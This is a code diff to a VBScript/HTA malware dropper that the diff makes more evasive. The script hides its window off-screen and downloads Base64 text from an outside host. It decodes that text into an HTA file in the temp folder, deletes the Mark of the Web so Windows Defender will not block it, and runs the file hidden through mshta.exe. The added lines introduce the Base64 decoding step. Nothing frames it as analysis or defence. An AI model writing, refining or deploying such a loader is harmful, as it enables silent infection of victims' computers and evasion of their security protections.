@@ -5,31 +5,38 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, st, path
+Dim sh, fso, xh, st, path, b64, xml, node
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
-
-' Download the payload
+' 1. Download the Base64 text
 xh.Open "GET", "https://dicerigx.app/payload.txt", False
 xh.Send
 
 If xh.Status = 200 Then
+    b64 = xh.responseText
+    path = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys.hta"
+    
+    ' 2. Decode the Base64 into the real HTA
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set node = xml.CreateElement("b64")
+    node.dataType = "bin.base64"
+    node.text = b64
+    
     Set st = CreateObject("ADODB.Stream")
     st.Type = 1
     st.Open
-    st.Write xh.responseBody
+    st.Write node.nodeTypedValue
     st.SaveToFile path, 2
     st.Close
     
-    ' Strip the Mark of the Web (MOTW) so Defender doesn't block it
+    ' 3. Strip the Mark of the Web
     On Error Resume Next
     fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
     
-    ' Run the local payload hidden
+    ' 4. Run the local file hidden
     sh.Run "mshta.exe """ & path & """", 0, False
 End If
 
